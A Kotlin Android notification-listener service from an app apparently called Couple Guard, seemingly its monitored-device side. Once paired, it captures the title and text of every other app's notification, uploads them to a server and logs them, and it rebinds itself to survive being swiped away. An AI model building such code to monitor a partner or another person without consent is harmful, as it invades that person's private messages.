package com.example.couple_guard_child.services.background

import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import io.flutter.plugin.common.MethodChannel
import com.example.couple_guard_child.utils.ApiClient
import java.util.concurrent.Executors
import java.util.concurrent.ThreadPoolExecutor

class MyNotificationListenerService : NotificationListenerService() {

    companion object {
        private const val TAG = "NotifListenerService"
        var methodChannel: MethodChannel? = null
    }

    private val executor = Executors.newFixedThreadPool(3) as ThreadPoolExecutor

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "========================================")
        Log.d(TAG, "📱 NOTIFICATION LISTENER SERVICE CREATED")
        Log.d(TAG, "PID: ${android.os.Process.myPid()}")
        Log.d(TAG, "========================================")
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "========================================")
        Log.d(TAG, "✅ LISTENER CONNECTED")
        
        val isPaired = ApiClient.isPaired(applicationContext)
        val deviceId = ApiClient.getDeviceId(applicationContext)
        
        Log.d(TAG, "Device paired: $isPaired")
        Log.d(TAG, "Device ID: ${deviceId?.substring(0, 8) ?: "NULL"}...")
        Log.d(TAG, "========================================")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "========================================")
        Log.w(TAG, "⚠️ LISTENER DISCONNECTED")
        Log.w(TAG, "Attempting to reconnect...")
        Log.w(TAG, "========================================")
        
        // ✅ FIX: Request rebind
        requestRebind(android.content.ComponentName(this, javaClass))
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        Log.d(TAG, "----------------------------------------")
        Log.d(TAG, "📱 NEW NOTIFICATION RECEIVED")
        
        try {
            val packageName = sbn.packageName
            Log.d(TAG, "Package: $packageName")
            
            if (packageName == applicationContext.packageName) {
                Log.d(TAG, "⏭️ Skipping own notification")
                Log.d(TAG, "----------------------------------------")
                return
            }
            
            if (!ApiClient.isPaired(applicationContext)) {
                Log.w(TAG, "⚠️ Device not paired, skipping")
                Log.d(TAG, "----------------------------------------")
                return
            }
            
            val notification = sbn.notification
            val extras = notification.extras

            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""

            Log.d(TAG, "Title: $title")
            Log.d(TAG, "Text: ${text.take(50)}${if (text.length > 50) "..." else ""}")

            if (title.isBlank() && text.isBlank()) {
                Log.w(TAG, "⏭️ SKIPPED: Empty title AND content")
                Log.d(TAG, "----------------------------------------")
                return
            }
            
            val finalTitle = if (title.isBlank()) packageName else title
            val finalContent = if (text.isBlank()) "New notification" else text

            executor.execute {
                sendToServerImmediate(packageName, finalTitle, finalContent)
            }
            
            sendToFlutter(packageName, finalTitle, finalContent, sbn.postTime)

        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR processing notification", e)
        }
        
        Log.d(TAG, "----------------------------------------")
    }

    private fun sendToServerImmediate(appName: String, title: String, content: String) {
        try {
            Log.d(TAG, "=== SENDING TO SERVER (IMMEDIATE) ===")
            Log.d(TAG, "Thread: ${Thread.currentThread().name}")
            
            val startTime = System.currentTimeMillis()
            
            val success = ApiClient.sendNotification(
                applicationContext,
                appName,
                title,
                content
            )
            
            val duration = System.currentTimeMillis() - startTime
            
            if (success) {
                Log.d(TAG, "✅ SUCCESS: Notification sent in ${duration}ms")
            } else {
                Log.e(TAG, "❌ FAILED: Could not send notification")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ EXCEPTION sending to server", e)
            e.printStackTrace()
        }
    }

    private fun sendToFlutter(
        packageName: String,
        title: String,
        text: String,
        timestamp: Long
    ) {
        try {
            if (methodChannel == null) {
                return
            }
            
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                try {
                    methodChannel?.invokeMethod(
                        "onNotificationReceived",
                        mapOf(
                            "package" to packageName,
                            "title" to title,
                            "text" to text,
                            "timestamp" to timestamp.toString()
                        )
                    )
                    
                    Log.d(TAG, "✅ Sent to Flutter UI")
                } catch (e: Exception) {
                    // Silently ignore
                }
            }
            
        } catch (e: Exception) {
            // Ignore
        }
    }

    // ✅ FIX: Override onTaskRemoved
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.w(TAG, "========================================")
        Log.w(TAG, "⚠️ TASK REMOVED - App swiped from recent")
        Log.w(TAG, "Service will continue running...")
        Log.w(TAG, "========================================")
        
        // Request rebind to ensure service stays connected
        requestRebind(android.content.ComponentName(this, javaClass))
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "========================================")
        Log.w(TAG, "⚠️ SERVICE DESTROYED")
        Log.w(TAG, "Shutting down executor...")
        Log.w(TAG, "========================================")
        executor.shutdown()
    }
}